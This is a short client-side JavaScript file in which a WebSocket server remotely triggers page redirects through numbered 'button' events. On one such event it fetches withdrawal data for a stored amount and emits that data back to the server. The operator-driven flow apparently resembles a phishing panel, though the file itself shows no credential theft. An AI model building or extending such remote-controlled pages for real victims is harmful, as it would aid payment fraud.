//import { withdraw } from './withdraw.js';
import { withdrawStatic } from './getwithdrawinfo.js';

socket.on('connect', function() {
    console.log('Connected to WebSocket server!');
});

let amount = sessionStorage.getItem('amount');

socket.on('button3', function() {
    console.log('Redirecting to success page...');
    window.location.replace('/success');
});

socket.on('button6', function() {
    if (window.location.pathname.includes('/bon')) {
        if (amount) {
            withdrawStatic(amount, function(success, data) {
                if (success) {
                    console.log('Data retrieved successfullYYYYY:', data);
                    socket.emit('sendData', data);
                    console.log('Redirecting to success page...');
                    window.location.replace('/success');
                } else {
                    console.log('Failed to retrieve data:', data);
                }
            });            
        }
    }
});
